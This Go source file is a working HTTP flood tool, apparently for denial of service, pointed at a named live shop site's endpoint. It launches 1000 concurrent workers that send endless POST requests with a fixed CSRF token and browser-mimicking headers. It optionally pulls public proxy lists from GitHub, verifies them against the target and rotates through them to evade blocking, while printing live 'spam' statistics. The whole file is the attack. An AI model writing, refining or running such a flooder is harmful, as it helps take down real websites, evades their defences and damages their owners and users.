package main

import (
	"bufio"
	"compress/gzip"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	mathrand "math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	TARGET_URL      = "https://dkshop.dev/controllers/dkshop"
	WORKERS         = 1000
	REQ_TIMEOUT     = 10 * time.Second
	PROXY_TEST_TO   = 10 * time.Second
	VERIFY_CONC     = 50  // số proxy verify song song
	MIN_POOL        = 50  // bắt đầu spam khi có ít nhất 200 proxy ok
	REFETCH_EVERY   = 90 * time.Second
)

// ── Stats ─────────────────────────────────────────────────────────────────────
var (
	statSent    int64
	statSuccess int64
	statFail    int64
	statBytes   int64
)

// ── Random generators ─────────────────────────────────────────────────────────
var (
	firstNames = []string{"James","John","Robert","Michael","William","David","Richard","Joseph","Thomas","Charles","Mary","Patricia","Jennifer","Linda","Barbara","Elizabeth","Susan","Jessica","Sarah","Karen","Liam","Noah","Oliver","Elijah","Lucas","Mason","Logan","Ethan","Aiden","Emma","Olivia","Ava","Isabella","Sophia","Mia"}
	lastNames  = []string{"Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Martinez","Wilson","Anderson","Taylor","Thomas","Jackson","White","Harris","Martin","Thompson","Robinson","Clark"}
	domains    = []string{"gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com","icloud.com","mail.com","tutanota.com","gmx.com","zoho.com"}
	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0"
	}
)

func randStr(n int) string {
	const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, n)
	for i := range b { b[i] = chars[mathrand.Intn(len(chars))] }
	return string(b)
}
func randName()  string { return firstNames[mathrand.Intn(len(firstNames))] + " " + lastNames[mathrand.Intn(len(lastNames))] }
func randEmail() string {
	return strings.ToLower(firstNames[mathrand.Intn(len(firstNames))]) +
		strings.ToLower(lastNames[mathrand.Intn(len(lastNames))]) +
		strconv.Itoa(mathrand.Intn(99999)) + "@" + domains[mathrand.Intn(len(domains))]
}
func randPass() string { return randStr(8) + strconv.Itoa(mathrand.Intn(9999)) }
func randUA()   string { return userAgents[mathrand.Intn(len(userAgents))] }

func buildBody() string {
	v := url.Values{}
	v.Set("action", "load_products")
	v.Set("category", "all")
	v.Set("csrf_token", "DWU3NkWoy1cnETdwEd26mSLvHz20QL6KsBSL3Xbn2e0%3D")
	return v.Encode()
}

// ── Proxy pool ────────────────────────────────────────────────────────────────
type Proxy struct{ Scheme, Host string; Port int }
func (p Proxy) URL() string { return fmt.Sprintf("%s://%s:%d", p.Scheme, p.Host, p.Port) }

var (
	goodPool   []Proxy
	poolMu     sync.RWMutex
	poolIdx    int64
	isFetching int32
	// signal: pool đã đủ MIN_POOL để bắt đầu
	poolReady  = make(chan struct{})
	poolOnce   sync.Once
)

var PROXY_SOURCES = []struct{ URL, Scheme string }{
	// SOCKS5
	{"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt", "socks5"},
	// SOCKS4
	{"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt", "socks4"},
	// HTTP
	{"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", "http"},
}

// ── Fetch raw list ────────────────────────────────────────────────────────────
func fetchText(u string) string {
	c := &http.Client{Timeout: 10 * time.Second}
	resp, err := c.Get(u)
	if err != nil { return "" }
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return string(b)
}

func fetchRaw() []Proxy {
	type res struct{ list []Proxy }
	ch := make(chan res, len(PROXY_SOURCES))
	for _, src := range PROXY_SOURCES {
		go func(u, scheme string) {
			list := []Proxy{}
			sc := bufio.NewScanner(strings.NewReader(fetchText(u)))
			for sc.Scan() {
				line := strings.TrimSpace(sc.Text())
				for _, pfx := range []string{"socks5://","socks4://","http://","https://"} {
					line = strings.TrimPrefix(line, pfx)
				}
				hp := strings.SplitN(line, ":", 2)
				if len(hp) != 2 { continue }
				if net.ParseIP(hp[0]) == nil { continue }
				port, err := strconv.Atoi(strings.TrimSpace(hp[1]))
				if err != nil || port <= 0 || port > 65535 { continue }
				list = append(list, Proxy{scheme, hp[0], port})
			}
			ch <- res{list}
		}(src.URL, src.Scheme)
	}

	seen := map[string]bool{}
	all := []Proxy{}
	for i := 0; i < len(PROXY_SOURCES); i++ {
		r := <-ch
		for _, p := range r.list {
			k := p.Host+":"+strconv.Itoa(p.Port)
			if !seen[k] { seen[k]=true; all=append(all, p) }
		}
	}
	mathrand.Shuffle(len(all), func(i,j int){ all[i],all[j]=all[j],all[i] })
	return all
}

// ── Verify proxy: test HTTP request tới target ────────────────────────────────
func verifyProxy(p Proxy) bool {
	pu, err := url.Parse(p.URL())
	if err != nil { return false }

	tr := &http.Transport{
		Proxy: http.ProxyURL(pu),
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DialContext: (&net.Dialer{Timeout: PROXY_TEST_TO}).DialContext,
		TLSHandshakeTimeout:   PROXY_TEST_TO,
		ResponseHeaderTimeout: PROXY_TEST_TO,
		DisableKeepAlives: true,
	}
	c := &http.Client{Transport: tr, Timeout: PROXY_TEST_TO,
		CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}

	req, err := http.NewRequestWithContext(context.Background(), "GET",
		"https://dkshop.dev/controllers/dkshop", nil)
	if err != nil { return false }
	req.Header.Set("User-Agent", randUA())

	resp, err := c.Do(req)
	if err != nil { return false }
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return resp.StatusCode < 500
}

// ── Stream verify: check song song 500 proxy, push vào pool ngay khi OK ──────
func streamVerify(raw []Proxy) {
	sem   := make(chan struct{}, VERIFY_CONC)
	var tested, ok int64
	total := int64(len(raw))

	for _, p := range raw {
		sem <- struct{}{}
		go func(px Proxy) {
			defer func() { <-sem }()
			good := verifyProxy(px)
			t := atomic.AddInt64(&tested, 1)
			if good {
				n := atomic.AddInt64(&ok, 1)
				poolMu.Lock()
				goodPool = append(goodPool, px)
				size := len(goodPool)
				poolMu.Unlock()
				// Signal khi đủ MIN_POOL
				if size >= MIN_POOL {
					poolOnce.Do(func() { close(poolReady) })
				}
				_ = n
			}
			if t % 500 == 0 || t == total {
				poolMu.RLock()
				sz := len(goodPool)
				poolMu.RUnlock()
				fmt.Printf("\r[Verify] %d/%d tested | good: %d          ", t, total, sz)
			}
		}(p)
	}
	// drain semaphore
	for i := 0; i < VERIFY_CONC; i++ { sem <- struct{}{} }
	poolMu.RLock()
	sz := len(goodPool)
	poolMu.RUnlock()
	fmt.Printf("\n[Verify] Done. Good proxies: %d\n", sz)
	// Đảm bảo signal dù ít hơn MIN_POOL
	poolOnce.Do(func() { close(poolReady) })
}

func getProxy() Proxy {
	poolMu.RLock()
	defer poolMu.RUnlock()
	if len(goodPool) == 0 { return Proxy{} }
	idx := atomic.AddInt64(&poolIdx, 1) % int64(len(goodPool))
	return goodPool[idx]
}

func removeProxy(p Proxy) {
	poolMu.Lock()
	defer poolMu.Unlock()
	for i, x := range goodPool {
		if x.Host == p.Host && x.Port == p.Port {
			goodPool = append(goodPool[:i], goodPool[i+1:]...)
			return
		}
	}
}

// ── HTTP client cache per goroutine ──────────────────────────────────────────
func newProxyClient(p Proxy) *http.Client {
	pu, _ := url.Parse(p.URL())
	tr := &http.Transport{
		Proxy: http.ProxyURL(pu),
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DialContext: (&net.Dialer{Timeout: REQ_TIMEOUT, KeepAlive: 30*time.Second}).DialContext,
		TLSHandshakeTimeout:   REQ_TIMEOUT,
		ResponseHeaderTimeout: REQ_TIMEOUT,
		MaxIdleConnsPerHost:   8,
		IdleConnTimeout:       30 * time.Second,
	}
	return &http.Client{Transport: tr, Timeout: REQ_TIMEOUT,
		CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}
}

// Direct client pool (64 để tránh mutex contention)
const DCPOOL = 128
var dcPool [DCPOOL]*http.Client
var dcIdx   int64
func init() {
	for i := range dcPool {
		tr := &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			DialContext: (&net.Dialer{Timeout: REQ_TIMEOUT, KeepAlive: 30*time.Second}).DialContext,
			TLSHandshakeTimeout:   REQ_TIMEOUT,
			ResponseHeaderTimeout: REQ_TIMEOUT,
			MaxIdleConnsPerHost:   50,
			IdleConnTimeout:       30*time.Second,
			DisableCompression:    true,
		}
		dcPool[i] = &http.Client{Transport: tr, Timeout: REQ_TIMEOUT,
			CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}
	}
}
func getDirect() *http.Client {
	return dcPool[atomic.AddInt64(&dcIdx,1)%DCPOOL]
}

// ── Worker ────────────────────────────────────────────────────────────────────
func workerDirect() {
	c := getDirect()
	for {
		body := buildBody()
		req, err := http.NewRequestWithContext(context.Background(), "POST", TARGET_URL, strings.NewReader(body))
		if err != nil { atomic.AddInt64(&statFail,1); continue }
		setHeaders(req)
		atomic.AddInt64(&statSent, 1)
		resp, err := c.Do(req)
		if err != nil { atomic.AddInt64(&statFail,1); continue }
		n := drain(resp)
		atomic.AddInt64(&statBytes, n+int64(len(body)))
		atomic.AddInt64(&statSuccess, 1)
	}
}

func workerProxy() {
	var curProxy Proxy
	var curClient *http.Client
	failCount := 0

	for {
		// Lấy proxy mới nếu fail nhiều
		if curClient == nil || failCount >= 3 {
			curProxy = getProxy()
			if curProxy.Host == "" {
				time.Sleep(100 * time.Millisecond)
				continue
			}
			curClient = newProxyClient(curProxy)
			failCount = 0
		}

		body := buildBody()
		req, err := http.NewRequestWithContext(context.Background(), "POST", TARGET_URL, strings.NewReader(body))
		if err != nil { atomic.AddInt64(&statFail,1); failCount++; continue }
		setHeaders(req)
		atomic.AddInt64(&statSent, 1)

		resp, err := curClient.Do(req)
		if err != nil {
			atomic.AddInt64(&statFail,1)
			failCount++
			if failCount >= 3 { removeProxy(curProxy); curClient = nil }
			continue
		}
		n := drain(resp)
		atomic.AddInt64(&statBytes, n+int64(len(body)))
		atomic.AddInt64(&statSuccess, 1)
		failCount = 0
	}
}

func setHeaders(req *http.Request) {
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	req.Header.Set("Origin", "https://dkshop.dev")
	req.Header.Set("Referer", "https://dkshop.dev/")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Sec-Fetch-Dest", "empty")
	req.Header.Set("Sec-Fetch-Mode", "cors")
	req.Header.Set("Sec-Fetch-Site", "same-origin")
}

func drain(resp *http.Response) int64 {
	var n int64
	if resp.Header.Get("Content-Encoding") == "gzip" {
		if gr, err := gzip.NewReader(resp.Body); err == nil {
			n, _ = io.Copy(io.Discard, gr); gr.Close()
		}
	} else {
		n, _ = io.Copy(io.Discard, resp.Body)
	}
	resp.Body.Close()
	return n
}

// ── Stats ─────────────────────────────────────────────────────────────────────
func fmtBytes(b int64) string {
	switch {
	case b >= 1<<30: return fmt.Sprintf("%.2fGB", float64(b)/(1<<30))
	case b >= 1<<20: return fmt.Sprintf("%.2fMB", float64(b)/(1<<20))
	case b >= 1<<10: return fmt.Sprintf("%.2fKB", float64(b)/(1<<10))
	default:         return fmt.Sprintf("%dB", b)
	}
}

func statsLoop(start time.Time, useProxy bool) {
	var lastS, lastF int64
	for range time.Tick(time.Second) {
		curS  := atomic.LoadInt64(&statSuccess)
		curF  := atomic.LoadInt64(&statFail)
		curSt := atomic.LoadInt64(&statSent)
		curB  := atomic.LoadInt64(&statBytes)
		rps   := curS - lastS
		fps   := curF - lastF
		lastS, lastF = curS, curF
		elapsed := time.Since(start).Seconds()
		poolSz := 0
		if useProxy { poolMu.RLock(); poolSz = len(goodPool); poolMu.RUnlock() }
		if useProxy {
			fmt.Printf("\r[%.0fs] sent:%d ok/s:%d fail/s:%d total_ok:%d data:%s pool:%d     ",
				elapsed, curSt, rps, fps, curS, fmtBytes(curB), poolSz)
		} else {
			fmt.Printf("\r[%.0fs] sent:%d ok/s:%d fail/s:%d total_ok:%d data:%s     ",
				elapsed, curSt, rps, fps, curS, fmtBytes(curB))
		}
	}
}

// ── Main ──────────────────────────────────────────────────────────────────────
func main() {
	runtime.GOMAXPROCS(runtime.NumCPU())
	mathrand.Seed(time.Now().UnixNano())

	fmt.Printf("[*] Target : %s\n", TARGET_URL)
	fmt.Printf("[*] Workers: %d | Timeout: %v\n\n", WORKERS, REQ_TIMEOUT)

	fmt.Print("Dùng proxy? (y/n): ")
	reader := bufio.NewReader(os.Stdin)
	ans, _ := reader.ReadString('\n')
	useProxy := strings.TrimSpace(strings.ToLower(ans)) == "y"

	if useProxy {
		fmt.Printf("[*] Fetch raw từ %d nguồn song song...\n", len(PROXY_SOURCES))
		raw := fetchRaw()
		fmt.Printf("[*] Raw: %d proxies → verify x%d concurrency...\n", len(raw), VERIFY_CONC)

		// Verify stream ngầm, spam khi đủ MIN_POOL
		go streamVerify(raw)

		fmt.Printf("[*] Chờ đủ %d proxy OK rồi spam...\n", MIN_POOL)
		<-poolReady
		poolMu.RLock()
		sz := len(goodPool)
		poolMu.RUnlock()
		fmt.Printf("[*] Pool: %d OK → BẮT ĐẦU SPAM\n\n", sz)

		// Refetch + reverify mỗi REFETCH_EVERY
		go func() {
			for range time.Tick(REFETCH_EVERY) {
				fmt.Print("\n[Pool] Refetch...\n")
				r := fetchRaw()
				poolMu.RLock()
				ex := map[string]bool{}
				for _, p := range goodPool { ex[p.Host+":"+strconv.Itoa(p.Port)] = true }
				poolMu.RUnlock()
				fresh := []Proxy{}
				for _, p := range r {
					if !ex[p.Host+":"+strconv.Itoa(p.Port)] { fresh = append(fresh, p) }
				}
				go streamVerify(fresh)
			}
		}()

		start := time.Now()
		for i := 0; i < WORKERS; i++ { go workerProxy() }
		statsLoop(start, true)
	} else {
		fmt.Println("[*] Direct mode - max speed")
		start := time.Now()
		for i := 0; i < WORKERS; i++ { go workerDirect() }
		statsLoop(start, false)
	}
}
